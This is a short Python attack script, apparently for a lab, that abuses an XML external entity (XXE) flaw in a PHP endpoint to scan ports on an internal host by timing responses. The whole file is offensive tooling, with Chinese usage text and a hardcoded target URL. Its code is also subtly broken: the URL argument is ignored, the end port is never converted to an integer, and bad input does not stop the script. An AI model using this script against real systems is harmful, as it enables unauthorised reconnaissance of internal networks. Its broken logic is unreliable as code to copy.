import requests
import base64
import sys

def XXE(target,port):
	xml = """<?xml version="1.0" encoding="utf-8"?> """
	xml = xml + "\r\n" + """<!DOCTYPE data SYSTEM "http://{}:""".format(target) + str(port) + """/" ["""
	xml = xml + "\r\n" + """<!ELEMENT data (#PCDATA)> """
	xml = xml + "\r\n" + """]>"""
	xml = xml + "\r\n" + """<data>7</data>"""
	r = requests.post('http://192.168.38.132/xxe_test.php', data=xml,timeout=5)	#记得修改靶机地址
	print(port,r.elapsed.total_seconds())

if __name__ == '__main__':


	try:
		url = sys.argv[1]
		target = sys.argv[2]
		ports = sys.argv[3]
	except:
		print('''
用法：python3 inhostscan.py 漏洞网址 带扫描的目标IP 扫描端口范围 
示例：python3 inhostscan.py http://192.168.38.132/xxe_test.php 192.168.38.129 1-65535
				''')
	start_port = int(ports.split('-')[0])
	end_port = (ports.split('-')[1])
	for i in range(start_port, end_port):
		XXE(target,i)
